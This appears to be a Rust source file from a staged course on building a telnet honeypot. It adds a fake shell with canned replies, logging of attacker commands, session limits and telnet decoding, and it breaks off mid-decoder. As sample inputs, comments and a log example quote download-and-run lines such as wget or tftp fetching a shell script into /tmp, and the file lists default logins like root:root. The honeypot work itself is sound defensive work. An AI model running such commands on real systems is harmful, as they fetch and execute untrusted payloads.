//! # Stage 7: A fake shell behind the login
//!
//! So far the login always says no, so you only learn which passwords people try. In this
//! stage a short list of common default logins gets in, and lands in a shell that's entirely
//! made up, so you can see what people do next. The honeypot learns to:
//! - read the list of logins to accept from a file you choose
//! - match commands as plain text, and answer with replies built into the program
//! - write every command and download address into the visit's log line
//! - give believable failures for downloads, without ever fetching anything
//! - end a session that runs too long, says too much or is sent too much
//! - open with the telnet negotiation a real device sends, and keep the replies out of what
//!   people typed
//!
//! Nothing is ever run. This file can't read files, start programs or connect to anything,
//! and a test fails if that ever changes. That's safety rules 1 and 2 in the README.
//!
//! A session's log line gets a `shell` part at the end, and other visits look as they did:
//!
//! ```text
//! {"time":1761935000,"source_ip":"203.0.113.7","outcome":"logged_in","username":"root","password":"root","telnet":"fffc01","shell":{"ended":"exit","commands":["cd /tmp","wget http://203.0.113.9/a.sh","exit"],"urls":["http://203.0.113.9/a.sh"],"reply_bytes":66}}
//! ```
//!
//! `telnet` holds any negotiation the visitor sent, as hex. Visits on a server without the shell
//! don't have it.
//!
//! Do the exercises in order, replacing each `todo!()`. Run one exercise's tests with
//! `cargo test fake_shell::tests::ex1_`. The `_` matters, because without it `ex1` also matches
//! `ex10` to `ex13`. Run all of Stage 7 with `cargo test fake_shell`.
//! Exercise 9 is in `src/server.rs`, next to the `TimeLimited` it's modelled on, and its tests
//! are in this file with the others. Exercise 13 came later, from what the first visitors did.
//! It's one new entry in `CANNED`, so it has no `todo!()`, and its tests fail until you add it.
//!
//! The tests named `guard_` already pass, and they should never stop passing. They protect
//! the safety rules, whatever else changes.
//!
//! `cargo run` still works as it did, because the shell stays off unless you pass
//! `--credentials`. With that flag, it crashes with "not yet implemented" until you've
//! finished this stage.

use std::collections::HashMap;
use std::io::{self, BufRead, Read, Write};
use std::net::{IpAddr, Ipv4Addr};

use chrono::NaiveDate;
use serde::Serialize;

use crate::login::{
    LOGIN_PROMPT, PASSWORD_PROMPT, REJECTION, ask, escape_for_log, strip_line_ending,
};
use crate::visit::{Outcome, Visit, clean_answer, outcome_of_error};

/// What the shell shows when it's ready for a command. Bots look for a character like this to
/// tell that a login worked.
pub const PROMPT: &str = "# ";

/// The longest piece of a command read in one go. A longer line carries on as the next
/// command, so nothing is lost and memory stays limited.
pub const MAX_COMMAND_BYTES: u64 = 2048;

/// The most lines one session can send before it's ended.
pub const MAX_COMMANDS_PER_SESSION: usize = 200;

/// The most text one session can add to its log line before it's ended: 64 KB.
pub const MAX_STORED_BYTES_PER_SESSION: usize = 64 * 1024;

/// The most one session can make the shell send back before it's ended: 8 KB. Asking for the
/// same reply over and over costs a visitor almost nothing, but you pay for outbound traffic.
pub const MAX_REPLY_BYTES_PER_SESSION: usize = 8 * 1024;

/// What one address's sessions can cost each day, counting their log lines and replies: 2 MB.
pub const MAX_SHELL_BYTES_PER_IP: u64 = 2 * 1024 * 1024;

/// What all sessions together can cost each day: 20 MB. At that rate the shell stays well
/// inside the 1 GB of outbound traffic a month that Free Tier covers, and adds at most 600 MB
/// of logs to the disk with `KEEP_DAYS` at 30.
pub const MAX_SHELL_BYTES_PER_DAY: u64 = 20 * 1024 * 1024;

// ---------------------------------------------------------------------------
// What the shell says
// ---------------------------------------------------------------------------

// Every word the shell can ever say is on this page. `&'static str` means text built into the
// program, which lasts as long as the program does. Text from a visitor only lasts as long as
// their connection, so the compiler refuses to let it in anywhere that wants `&'static str`.
// That's how you know nothing a visitor types can be repeated back to them.
//
// Real replies often do repeat the command, like `sh: foo: not found`. These don't, which is a
// small clue that this isn't a real shell. It's a price worth paying for a rule the compiler
// checks for you.

/// Commands with a reply. The first match wins, so a longer key has to come before a shorter
/// one, and a test checks that. Add to this list as you learn what people try. Keep the
/// replies generic, with no real company's or product's name, which is safety rule 5.
pub const CANNED: &[(&str, &str)] = &[
    (
        "uname -a",
        "Linux localhost 4.9.0 #1 SMP armv7l GNU/Linux\r\n",
    ),
    ("uname -m", "armv7l\r\n"),
    ("uname -r", "4.9.0\r\n"),
    ("uname", "Linux\r\n"),
    ("whoami", "root\r\n"),
    ("id", "uid=0(root) gid=0(root) groups=0(root)\r\n"),
    ("pwd", "/root\r\n"),
    (
        "ls",
        "bin   dev   etc   home  lib   proc  root  sbin  sys   tmp   usr   var\r\n",
    ),
    (
        "ps",
        "  PID USER     COMMAND\r\n    1 root     init\r\n  214 root     -sh\r\n",
    ),
    (
        "uptime",
        " 12:00:00 up 3 days,  2:14,  load average: 0.00, 0.01, 0.05\r\n",
    ),
    (
        "free",
        "              total        used        free\r\nMem:          59980       21340       38640\r\n",
    ),
    (
        "cat /proc/cpuinfo",
        "processor\t: 0\r\nmodel name\t: ARMv7 Processor rev 5 (v7l)\r\nHardware\t: Generic\r\n",
    ),
    (
        "cat /proc/version",
        "Linux version 4.9.0 (gcc version 6.3.0) #1 SMP\r\n",
    ),
    ("cat", "cat: can't open file: No such file or directory\r\n"),
    ("busybox", "busybox: applet not found\r\n"),
    // EXERCISE 13: give one bot's check the word it's looking for.
    //
    // The README has the whole story. The first bot to log in sent `echo SHELL_TEST`, got the
    // blank line below and hung up, 11 times. The likeliest reason is that it was waiting to see
    // `SHELL_TEST` come back, and it never could.
    //
    // Add one entry to this list: the command `echo SHELL_TEST`, with the reply `SHELL_TEST\r\n`.
    // Where it goes matters, because of the rule at the top of this list.
    //
    // The new idea is the difference between repeating text and happening to match it. This reply
    // is fixed text built into the program, so it's still `&'static str`, and the compiler is
    // still what stops a visitor's words coming back. `echo ANYTHING_ELSE` still gets the blank
    // line. A real `echo` that sends back whatever was typed wouldn't compile here, and that's
    // the point.
    ("echo SHELL_TEST", "SHELL_TEST\r\n"),
    ("echo", "\r\n"),
    // These print nothing when they work, so printing nothing looks right. None of them do
    // anything either.
    ("cd", ""),
    ("sh", ""),
    ("shell", ""),
    ("enable", ""),
    ("system", ""),
    ("linuxshell", ""),
    ("export", ""),
    ("chmod", ""),
    ("rm", ""),
    ("mkdir", ""),
    ("touch", ""),
    ("cp", ""),
    ("mv", ""),
    ("kill", ""),
    ("sleep", ""),
    ("true", ""),
    ("clear", ""),
    ("history", ""),
];

/// The reply to anything else.
pub const NOT_FOUND: &str = "-sh: not found\r\n";

/// Download tools, and the failure each one reports. Matched anywhere in a command, so
/// `/bin/busybox wget` counts. Add to this list if the logs show other tools being used.
pub const DOWNLOAD_FAILURES: &[(&str, &str)] = &[
    (
        "wget",
        "wget: can't connect to remote host: Network is unreachable\r\n",
    ),
    ("curl", "curl: (7) Couldn't connect to server\r\n"),
    ("tftp", "tftp: timeout\r\n"),
    (
        "ftpget",
        "ftpget: can't connect to remote host: Network is unreachable\r\n",
    ),
];

/// The failure for a URL in any other command.
pub const NETWORK_FAILURE: &str = "-sh: Network is unreachable\r\n";

/// What separates words when looking for download addresses, besides spaces. Quotes are here
/// so that `curl "http://example.com/a.sh"` gives the address without them.
const WORD_BREAKS: &str = "'\"`;|()<>";

// ---------------------------------------------------------------------------
// Which logins get in
// ---------------------------------------------------------------------------

/// The logins the fake shell accepts. They get cleaned the same way as what visitors type, so
/// the two can be compared directly.
#[derive(Debug, Clone, PartialEq)]
pub struct Credentials {
    pairs: Vec<(String, String)>,
}

fn list_error(message: String) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidInput, message)
}

impl Credentials {
    /// EXERCISE 1: read the list of logins to accept.
    ///
    /// The list has one login on each line, as `username:password`. Blank lines and lines
    /// starting with `#` are skipped. A password can be empty, because some devices ship
    /// that way:
    ///
    /// ```text
    /// # Common defaults. Never put a password anyone really uses in here.
    /// root:root
    /// admin:
    /// ```
    ///
    /// A line with no `:` or with an empty username is an error, and so is a list with no
    /// logins in it. As with the command line in Stage 5, a mistake must never be quietly
    /// ignored, or the shell could be closed without you knowing. Use `list_error`, and put
    /// the line's number in the message, like `line 3`.
    ///
    /// The new idea is `let ... else`, which leaves early when a pattern doesn't match:
    ///
    /// ```text
    /// let Some((username, password)) = line.split_once(':') else {
    ///     return Err(list_error(format!("line {number}: ...")));
    /// };
    /// ```
    ///
    /// Hints:
    /// - `text.lines().enumerate()` gives you `(index, line)`, counting from 0, like
    ///   `enumerate` in Python. `.lines()` already removes `\n` and `\r\n`.
    /// - Use `line.trim()` to decide whether to skip a line, but split the untrimmed line,
    ///   because a space in a password is part of the password.
    /// - `split_once` stops at the first `:`, so a password can contain one.
    /// - Run both parts through `escape_for_log` before you store them.
    pub fn parse(text: &str) -> io::Result<Credentials> {
        let mut pairs = Vec::new();
        for (index, line) in text.lines().enumerate() {
            let number = index + 1;
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            let Some((username, password)) = line.split_once(':') else {
                return Err(list_error(format!("line {number}: missing ':'")));
            };
            if username.is_empty() {
                return Err(list_error(format!("line {number}: missing username")));
            }
            let username = escape_for_log(username);
            let password = escape_for_log(password);
            pairs.push((username, password));
        }
        if pairs.is_empty() {
            return Err(list_error("no valid logins found".into()));
        }
        Ok(Credentials { pairs })
    }

    /// EXERCISE 2: decide whether a username and password are on the list.
    ///
    /// Both have to match the same line. With `root:root` and `admin:admin` on the list,
    /// `root` with the password `admin` stays out.
    ///
    /// The new idea is unpacking a pair in a closure's arguments:
    ///
    /// ```text
    /// self.pairs.iter().any(|(user, pass)| ...)
    /// ```
    ///
    /// Hint: `user` is a `&String` and `username` is a `&str`, and `==` can compare them.
    pub fn accepts(&self, username: &str, password: &str) -> bool {
        self.pairs
            .iter()
            .any(|(user, pass)| *user == username && *pass == password)
    }

    /// How many logins are on the list.
    pub fn count(&self) -> usize {
        self.pairs.len()
    }
}

// ---------------------------------------------------------------------------
// Reading commands as text
// ---------------------------------------------------------------------------

/// EXERCISE 3: split a line into the commands chained together in it.
///
/// Attackers send lines like `cd /tmp; wget http://example.com/a.sh && sh a.sh | tee log`.
/// Split on `;`, `&&` and `|`, which also splits `||`. Trim each piece and drop the empty ones.
///
/// A single `&` is left alone, because URLs often contain one. Quotes aren't treated specially
/// either. A real shell's rules are complicated, and you don't need them, because nothing here
/// is ever run. The whole line goes in the log anyway, so nothing is lost if a split is wrong.
///
/// The new idea is `flat_map`, which replaces each item with several. It's the same as
/// `flatMap` in JS:
///
/// ```text
/// line.split(';').flat_map(|piece| piece.split("&&"))
/// ```
///
/// Do these in order, as one chain:
/// 1. Split on `;`, then `&&`, then `|`.
/// 2. `.map(str::trim)` trims each piece.
/// 3. `.filter(|piece| !piece.is_empty())` drops the empty ones.
/// 4. `.collect()` builds the `Vec`.
///
/// Every piece is a view into `line`, so no text gets copied.
pub fn split_commands(line: &str) -> Vec<&str> {
    line.split(';')
        .flat_map(|piece| piece.split("&&"))
        .flat_map(|piece| piece.split('|'))
        .map(str::trim)
        .filter(|piece| !piece.is_empty())
        .collect()
}

/// Does this command use a download tool?
fn uses_download_tool(part: &str) -> bool {
    DOWNLOAD_FAILURES
        .iter()
        .any(|(tool, _)| part.contains(tool))
}

// This is a worked example, not an exercise. It spots an address with no `http://` on the
// front, which is how download tools are often used:
//
//     wget 203.0.113.9/a.sh
//     tftp -g -r a.sh 203.0.113.9
//
// `parse` only ever reads the text, as in Stage 5, and never looks up a name. A word like
// `a.sh` has no `/`, and `/tmp/a.sh` and `./a.sh` start with a path, so none of them match.
fn looks_like_address(word: &str) -> bool {
    let host = word.split(['/', ':']).next().unwrap_or("");
    if host.parse::<Ipv4Addr>().is_ok() {
        return true;
    }
    word.contains('/') && host.contains('.') && !word.starts_with(['.', '-'])
}

/// EXERCISE 4: find the download addresses in one command.
///
/// Return every word that either:
/// - contains `://`, in any command at all, or
/// - passes `looks_like_address`, but only if `uses_download_tool(part)` is true, so
///   `ping 203.0.113.9` doesn't count.
///
/// These are only ever written down. Nothing in this program can connect to them, and you
/// shouldn't open them either, even on your own computer. That's safety rule 2.
///
/// The new idea is splitting with a closure instead of a single character:
///
/// ```text
/// part.split(|c: char| c.is_whitespace() || WORD_BREAKS.contains(c))
/// ```
///
/// Hint: finish like `split_commands`, with `.filter(...)` and `.collect()`. Work out the
/// answer to `uses_download_tool` first, and keep it in a variable the closure can use.
pub fn find_urls(part: &str) -> Vec<&str> {
    let has_download_tool = uses_download_tool(part);
    part.split(|c: char| c.is_whitespace() || WORD_BREAKS.contains(c))
        .filter(|word| word.contains("://") || (has_download_tool && looks_like_address(word)))
        .collect()
}

/// EXERCISE 5: if this command is a download, return the failure to report.
///
/// Go through `DOWNLOAD_FAILURES`, and return the failure of the first tool that appears
/// anywhere in `part`. Otherwise, if `part` contains `://`, return `NETWORK_FAILURE`.
/// Otherwise return `None`.
///
/// The new idea is the return type, `Option<&'static str>`: either nothing, or text built into
/// the program. Try returning `Some(part)` once, to see the compiler refuse it. That error is
/// the safety rule doing its job.
///
/// Hints:
/// - Unpack each pair as you did in `dated_log_files`:
///   `for (tool, failure) in DOWNLOAD_FAILURES`.
/// - `failure` is a reference to the `&'static str` in the list, so return `Some(*failure)`.
pub fn download_failure(part: &str) -> Option<&'static str> {
    for (tool, failure) in DOWNLOAD_FAILURES {
        if part.contains(tool) {
            return Some(*failure);
        }
    }
    if part.contains("://") {
        return Some(NETWORK_FAILURE);
    }
    None
}

// This is a worked example, not an exercise. It removes a path from the first word, so that
// `/bin/uname -a` is treated as `uname -a`. Cutting right after a `/` can't land in the middle
// of a character, so hostile text can't crash this.
fn without_path(part: &str) -> &str {
    let first_word_ends = part.find(char::is_whitespace).unwrap_or(part.len());
    match part[..first_word_ends].rfind('/') {
        Some(slash) => &part[slash + 1..],
        None => part,
    }
}

// A key matches the whole command, or the start of it up to a space. So `ls` matches `ls -la`,
// but not `lsof`.
fn matches_key(command: &str, key: &str) -> bool {
    match command.strip_prefix(key) {
        Some(rest) => rest.is_empty() || rest.starts_with(char::is_whitespace),
        None => false,
    }
}

/// Does this command end the session?
pub fn ends_session(part: &str) -> bool {
    let command = without_path(part);
    matches_key(command, "exit") || matches_key(command, "logout")
}

/// EXERCISE 6: choose the reply to one command.
///
/// Do these in order:
/// 1. If `download_failure` has a failure for `part`, return that.
/// 2. Use `without_path` to get the command to look up.
/// 3. Return the reply of the first entry in `CANNED` whose key passes `matches_key`.
/// 4. If there's none, return `NOT_FOUND`.
///
/// The new idea is `.find(...)`, which is `array.find(...)` in JS, except it gives you an
/// `Option` instead of `undefined`:
///
/// ```text
/// match CANNED.iter().find(|(key, _)| matches_key(command, key)) {
///     Some((_, reply)) => reply,
///     None => NOT_FOUND,
/// }
/// ```
///
/// Hint: `if let Some(failure) = download_failure(part) { return failure; }` handles step 1.
pub fn canned_reply(part: &str) -> &'static str {
    if let Some(failure) = download_failure(part) {
        return failure;
    }
    let command = without_path(part);
    match CANNED.iter().find(|(key, _)| matches_key(command, key)) {
        Some((_, reply)) => reply,
        None => NOT_FOUND,
    }
}

// ---------------------------------------------------------------------------
// One session
// ---------------------------------------------------------------------------

/// How a session ended.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum SessionEnd {
    /// They typed `exit` or `logout`.
    Exit,
    /// They disconnected.
    Left,
    /// The visit's time limit ran out.
    TimedOut,
    /// They went over one of this session's limits, so the shell ended it.
    OverLimit,
}

/// Everything that happened in the fake shell during one visit.
///
/// Commands and addresses hold text a visitor typed, so they're cleaned before they're stored,
/// and they never appear on screen.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct ShellSession {
    pub(crate) ended: SessionEnd,
    pub(crate) commands: Vec<String>,
    pub(crate) urls: Vec<String>,
    pub(crate) reply_bytes: usize,
    // `skip` leaves this out of the log, because it's only here to apply a limit.
    #[serde(skip)]
    pub(crate) stored_bytes: usize,
}

// This is a worked example, not an exercise. It reads a line like `read_answer` does in Stage
// 1, with a higher limit, because a command can be much longer than a username.
pub fn read_command(reader: &mut impl BufRead) -> io::Result<String> {
    let mut bytes = Vec::new();
    reader
        .take(MAX_COMMAND_BYTES)
        .read_until(b'\n', &mut bytes)?;
    Ok(String::from_utf8_lossy(&bytes).to_string())
}

impl ShellSession {
    pub fn new() -> ShellSession {
        ShellSession {
            ended: SessionEnd::Left,
            commands: Vec::new(),
            urls: Vec::new(),
            reply_bytes: 0,
            stored_bytes: 0,
        }
    }

    // This is a worked example, not an exercise. It's the only way the shell sends anything,
    // and `&'static str` means it can only send text built into the program. `Ok(false)` means
    // this would go over the session's limit, so nothing was sent.
    fn send(&mut self, text: &'static str, writer: &mut impl Write) -> io::Result<bool> {
        if self.reply_bytes + text.len() > MAX_REPLY_BYTES_PER_SESSION {
            return Ok(false);
        }
        writer.write_all(text.as_bytes())?;
        self.reply_bytes += text.len();
        Ok(true)
    }

    /// EXERCISE 7: write down one line a visitor sent, if there's room.
    ///
    /// Return `false`, and store nothing, if the session already has
    /// `MAX_COMMANDS_PER_SESSION` commands, or if the cleaned line would take `stored_bytes`
    /// over `MAX_STORED_BYTES_PER_SESSION`. Blank lines count, so pressing Enter forever can't
    /// keep a session going.
    ///
    /// Do these in order:
    /// 1. Clean the line, as in Stage 1: `escape_for_log(strip_line_ending(line))`.
    /// 2. Check the limits, and return `false` if there's no room.
    /// 3. For each part from `split_commands(line)`, and each address from `find_urls(part)`,
    ///    clean the address the same way, add its length to `stored_bytes`, and push it onto
    ///    `self.urls`.
    /// 4. Add the cleaned line's length to `stored_bytes`, push it onto `self.commands`, and
    ///    return `true`.
    ///
    /// The new idea is doing the risky part on the original text and storing only the cleaned
    /// text. Looking for addresses needs the real quotes and spaces, and cleaning would change
    /// those. No uncleaned text gets stored, which is the same promise as `LoginAttempt` in
    /// Stage 1.
    pub fn record(&mut self, line: &str) -> bool {
        let cleaned_line = escape_for_log(strip_line_ending(line));
        if self.commands.len() >= MAX_COMMANDS_PER_SESSION
            || self.stored_bytes + cleaned_line.len() > MAX_STORED_BYTES_PER_SESSION
        {
            return false;
        }
        for part in split_commands(line) {
            for url in find_urls(part) {
                let cleaned_url = escape_for_log(strip_line_ending(url));
                self.stored_bytes += cleaned_url.len();
                self.urls.push(cleaned_url);
            }
        }
        self.stored_bytes += cleaned_line.len();
        self.commands.push(cleaned_line);
        true
    }

    /// EXERCISE 8: run the shell until the session ends.
    ///
    /// The new idea is `loop`, which repeats until you `return` or `break`, and it's where the
    /// stage comes together. Replies only ever come from `canned_reply`, and nothing typed
    /// here does anything except get written down.
    ///
    /// Each time around the loop:
    /// 1. `self.send(PROMPT, writer)?`. If that gives `false`, set `self.ended` to
    ///    `SessionEnd::OverLimit` and return `Ok(())`.
    /// 2. `read_command(reader)?`. If the line is empty, the connection has closed, so leave
    ///    `self.ended` as `Left` and return `Ok(())`. A line holding only `\n` isn't empty.
    /// 3. `self.record(&line)`. If that gives `false`, it's `OverLimit` again.
    /// 4. For each part from `split_commands(&line)`:
    ///    - If `ends_session(part)`, set `self.ended` to `SessionEnd::Exit` and return.
    ///    - Otherwise `self.send(canned_reply(part), writer)?`. If that gives `false`, it's
    ///      `OverLimit` again.
    ///
    /// Each command goes into `self` as it arrives. So if a `?` leaves early, everything so far
    /// is still there, as with `ask_for_answers` in Stage 2.
    pub fn run(&mut self, reader: &mut impl BufRead, writer: &mut impl Write) -> io::Result<()> {
        loop {
            if !self.send(PROMPT, writer)? {
                self.ended = SessionEnd::OverLimit;
                return Ok(());
            }
            let line = read_command(reader)?;
            if line.is_empty() {
                return Ok(());
            }
            if !self.record(&line) {
                self.ended = SessionEnd::OverLimit;
                return Ok(());
            }
            for part in split_commands(&line) {
                if ends_session(part) {
                    self.ended = SessionEnd::Exit;
                    return Ok(());
                }
                if !self.send(canned_reply(part), writer)? {
                    self.ended = SessionEnd::OverLimit;
                    return Ok(());
                }
            }
        }
    }

    /// How much happened, for showing on screen. Commands and addresses can hold passwords and
    /// other people's servers, so they're counted and never shown, as passwords are in Stage 3.
    pub fn screen_summary(&self) -> String {
        format!(
            "shell: ended={:?} commands={} urls={} sent={}",
            self.ended,
            self.commands.len(),
            self.urls.len(),
            self.reply_bytes
        )
    }
}

impl Default for ShellSession {
    fn default() -> ShellSession {
        ShellSession::new()
    }
}

// ---------------------------------------------------------------------------
// What the shell can cost each day
// ---------------------------------------------------------------------------

/// How much the shell has cost today, in log lines and replies, overall and for each address.
///
/// When there's no room left, logins are rejected as they were before Stage 7. So running out
/// only ever makes the honeypot do less.
#[derive(Debug)]
pub struct ShellBudget {
    max_per_ip: u64,
    max_total: u64,
    max_tracked: usize,
    date: Option<NaiveDate>,
    total: u64,
    per_ip: HashMap<IpAddr, u64>,
}

impl ShellBudget {
    pub fn new(max_per_ip: u64, max_total: u64, max_tracked: usize) -> ShellBudget {
        ShellBudget {
            max_per_ip,
            max_total,
            max_tracked,
            date: None,
            total: 0,
            per_ip: HashMap::new(),
        }
    }

    // A new day starts the counts again, like `start_minute` in Stage 5.
    fn start_day(&mut self, today: NaiveDate) {
        if self.date != Some(today) {
            self.date = Some(today);
            self.total = 0;
            self.per_ip.clear();
        }
    }

    /// EXERCISE 10: decide whether this address may use the shell right now.
    ///
    /// Do these in order:
    /// 1. Call `self.start_day(today)`.
    /// 2. Return `false` if `self.total` has reached `self.max_total`.
    /// 3. Return `false` if this address's count has reached `self.max_per_ip`. An address
    ///    that isn't in the map has spent 0.
    /// 4. Return `false` if the address isn't in the map and the map has reached
    ///    `self.max_tracked`, so that memory use stays limited.
    /// 5. Otherwise return `true`.
    ///
    /// Sessions are charged when they end, so a few at once can go slightly over. That's fine,
    /// because each one has its own limits and there's a cap on connections. This has the same
    /// shape as `RateLimit::allow`, so that's a good place to look if you get stuck. The new
    /// idea is checking a limit without using any of it up.
    pub fn has_room(&mut self, ip: IpAddr, today: NaiveDate) -> bool {
        self.start_day(today);
        if self.total >= self.max_total {
            return false;
        }
        let ip_count = self.per_ip.get(&ip).copied().unwrap_or(0);
        if ip_count >= self.max_per_ip {
            return false;
        }
        if !self.per_ip.contains_key(&ip) && self.per_ip.len() >= self.max_tracked {
            return false;
        }
        true
    }

    /// Charges a finished session to this address and to the day's total.
    pub fn spend(&mut self, ip: IpAddr, today: NaiveDate, bytes: u64) {
        self.start_day(today);
        self.total += bytes;
        if self.per_ip.contains_key(&ip) || self.per_ip.len() < self.max_tracked {
            *self.per_ip.entry(ip).or_insert(0) += bytes;
        }
    }
}

// ---------------------------------------------------------------------------
// The login, with a way in
// ---------------------------------------------------------------------------

impl Visit {
    /// EXERCISE 11: run the login, and either let them in or reject them.
    ///
    /// This is `ask_for_answers` from Stage 2 with one change: `REJECTION` is no longer the
    /// only ending. Stage 1's `fake_login` and Stage 2's `run_fake_login` stay as they are,
    /// and they still always say no.
    ///
    /// Do these in order:
    /// 1. `ask` with `LOGIN_PROMPT`, and store the `clean_answer` in `self.username`.
    /// 2. `ask` with `PASSWORD_PROMPT`, and store the `clean_answer` in `self.password`.
    /// 3. If both are `Some` and `credentials.accepts(...)` says yes, start a session and
    ///    return what its `run` gives you.
    /// 4. Otherwise send `REJECTION` and flush.
    ///
    /// The new idea is matching two `Option`s at once by putting them in a pair, adding a
    /// condition with `&&`, and `Option::insert`, which stores a value and hands back a `&mut`
    /// to it:
    ///
    /// ```text
    /// if let (Some(username), Some(password)) = (&self.username, &self.password)
    ///     && credentials.accepts(username, password)
    /// {
    ///     return self.shell.insert(ShellSession::new()).run(reader, writer);
    /// }
    /// ```
    ///
    /// The session lives in `self.shell` from the start, so whatever it has recorded is still
    /// there if something goes wrong halfway through.
    pub fn login_then_shell(
        &mut self,
        reader: &mut impl BufRead,
        writer: &mut impl Write,
        credentials: &Credentials,
    ) -> io::Result<()> {
        let username = ask(LOGIN_PROMPT, reader, writer)?;
        self.username = clean_answer(&username);
        let password = ask(PASSWORD_PROMPT, reader, writer)?;
        self.password = clean_answer(&password);
        if let (Some(username), Some(password)) = (&self.username, &self.password)
            && credentials.accepts(username, password)
        {
            return self.shell.insert(ShellSession::new()).run(reader, writer);
        }
        writer.write_all(REJECTION.as_bytes())?;
        writer.flush()?;
        Ok(())
    }

    // This is a worked example, not an exercise. It's `run_fake_login` from Stage 2 for a login
    // that can succeed, and it works out how the visit ended. An error before the login worked
    // sets the visit's outcome, as it always did. An error after that belongs to the session.
    pub fn run_login_or_shell(
        &mut self,
        reader: &mut impl BufRead,
        writer: &mut impl Write,
        credentials: &Credentials,
    ) {
        if let Err(error) = self.login_then_shell(reader, writer, credentials) {
            let outcome = outcome_of_error(&error);
            match &mut self.shell {
                Some(session) if outcome == Outcome::TimedOut => {
                    session.ended = SessionEnd::TimedOut
                }
                Some(session) => session.ended = SessionEnd::Left,
                None => self.outcome = outcome,
            }
        }
        if self.shell.is_some() {
            self.outcome = Outcome::LoggedIn;
        } else if self.password.is_some() {
            self.outcome = Outcome::Attempted;
        }
    }
}

// ---------------------------------------------------------------------------
// Speaking telnet
// ---------------------------------------------------------------------------

// Telnet mixes two things in one stream: text, and messages about the connection. Byte 255, called
// IAC ("interpret as command"), means a message follows.
const IAC: u8 = 255;
const DONT: u8 = 254;
const DO: u8 = 253;
const WILL: u8 = 251;
const SB: u8 = 250;
const SE: u8 = 240;
const OPTION_ECHO: u8 = 1;
const OPTION_SUPPRESS_GO_AHEAD: u8 = 3;
const OPTION_WINDOW_SIZE: u8 = 31;
const CR: u8 = b'\r';
const NUL: u8 = 0;

/// What a telnet server says before anything else. These are the 12 bytes many small devices have
/// been sending for years, and they hold nothing but protocol numbers.
///
/// A real device speaks first, and the fake login didn't. In the first days on the internet, most
/// visitors connected, sent nothing at all for about 8 seconds with `login: ` in front of them,
/// hung up and tried again. This is the likeliest reason, though the logs can't prove it, which is
/// why the README says how to check. Like every other reply, this is fixed text built into the
/// program.
///
/// `WILL ECHO` is the server saying "I'll handle echoing, so don't show what's typed", and then
/// this server never echoes, because it never repeats anything. A person using a real `telnet`
/// program won't see their typing. Bots don't care.
pub const TELNET_OPENING: &[u8] = &[
    IAC,
    DO,
    OPTION_ECHO,
    IAC,
    DO,
    OPTION_WINDOW_SIZE,
    IAC,
    WILL,
    OPTION_ECHO,
    IAC,
    WILL,
    OPTION_SUPPRESS_GO_AHEAD,
];

/// The most negotiation to keep for one visit. Real negotiation is much shorter than this.
pub const MAX_TELNET_BYTES_KEPT: usize = 256;

/// How far through a telnet message the decoder is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TelnetState {
    /// Reading ordinary text.
    Text,
    /// The last byte was a carriage return.
    AfterCr,
    /// The last byte was IAC.
    AfterIac,
    /// The last two bytes were IAC and one of WILL, WONT, DO or DONT.
    AfterVerb,
    /// Inside a longer message, between `IAC SB` and `IAC SE`.
    InLongMessage,
    /// Inside a longer message, and the last byte was IAC.
    InLongMessageAfterIac,
}

/// Separates text from telnet negotiation, one byte at a time.
#[derive(Debug)]
pub struct TelnetDecoder {
    state: TelnetState,
}

impl TelnetDecoder {
    pub fn new() -> TelnetDecoder {
        TelnetDecoder {
            state: TelnetState::Text,
        }
    }

    /// EXERCISE 12: take one byte, and give it back only if it's text.
    ///
    /// Once the server has sent `TELNET_OPENING`, clients answer it, and the answers arrive right
    /// in front of the username. Unless they're removed, `root` looks like `\u{fffd}\u{fffd}...root`,
    /// and no login on the list ever matches. So the opening is useless without this.
    ///
    /// The network can cut a message in half, so one call can never see a whole message. The
    /// decoder remembers how far through it is in `self.state`. That's called a *state machine*.
    ///
    /// Telnet also has its own way to say Enter. A client in the mode the opening asks for sends a
    /// carriage return and then a zero byte. `read_command` only stops at `\n`, so that zero byte
    /// has to become one, or the line would never end.
    ///
    /// The new idea is matching on a pair, which lets you write the whole table out as code. The
    /// compiler refuses to build it if you've missed a case:
    ///
    /// ```text
    /// let (next, keep) = match (self.state, byte) {
    ///     (TelnetState::Text, IAC) => (TelnetState::AfterIac, None),
    ///     (TelnetState::Text, CR) => (TelnetState::AfterCr, Some(byte)),
    ///     (TelnetState::Text, _) => (TelnetState::Text, Some(byte)),
    ///     // and so on for the rest of the table
    /// };
    /// self.state = next;
    /// keep
    /// ```
    ///
    /// Here's the whole table:
    ///
    /// ```text
    /// state                  byte           next state             give back
    /// Text                   IAC            AfterIac               nothing
    /// Text                   CR             AfterCr                the byte
    /// Text                   anything else  Text                   the byte
    /// AfterCr                NUL            Text                   b'\n'
    /// AfterCr                IAC            AfterIac               nothing
    /// AfterCr                CR             AfterCr                the byte
    /// AfterCr                anything else  Text                   the byte
    /// AfterIac               IAC            Text                   the byte (a real 255)
    /// AfterIac               WILL..=DONT    AfterVerb              nothing
    /// AfterIac               SB             InLongMessage          nothing
    /// AfterIac               anything else  Text                   nothing
    /// AfterVerb              anything       Text                   nothing
    /// InLongMessage          IAC            InLongMessageAfterIac  nothing
    /// InLongMessage          anything else  InLongMessage          nothing
    /// InLongMessageAfterIac  SE             Text                   nothing
    /// InLongMessageAfterIac  anything else  InLongMessage          nothing
    /// ```
    ///
    /// Hint: `WILL..=DONT` is a range, and it works as a pattern: those four are 251 to 254.
    pub fn feed(&mut self, byte: u8) -> Option<u8> {
        let (next, keep) = match (self.state, byte) {
            (TelnetState::Text, IAC) => (TelnetState::AfterIac, None),
            (TelnetState::Text, CR) => (TelnetState::AfterCr, Some(byte)),
            (TelnetState::Text, _) => (TelnetState::Text, Some(byte)),
            (TelnetState::AfterCr, NUL) => (TelnetState::Text, Some(b'\n')),
            (TelnetState::AfterCr, IAC) => (TelnetState::AfterIac, None),
            (TelnetState::AfterCr, CR) => (TelnetState::AfterCr, Some(byte)),
            (TelnetState::AfterCr, _) => (TelnetState::Text, Some(byte)),
            (TelnetState::AfterIac, IAC) => (TelnetState::Text, Some(byte)),
            (TelnetState::AfterIac, WILL..=DONT) => (TelnetState::AfterVerb, None),
            (TelnetState::AfterIac, SB) => (TelnetState::InLongMessage, None),
            (TelnetState::AfterIac, _) => (TelnetState::Text, None),
